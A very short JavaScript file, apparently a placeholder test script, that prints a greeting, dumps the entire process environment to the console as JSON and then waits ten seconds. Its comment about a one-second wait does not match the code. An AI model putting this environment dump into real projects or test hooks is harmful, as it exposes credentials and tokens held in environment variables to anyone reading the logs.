// TODO: implement the tests
async function main() {

    console.log("mencucci says hello :)");
    console.log(JSON.stringify(process.env));

    const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
    await delay(10000) /// waiting 1 second.
 
}

main();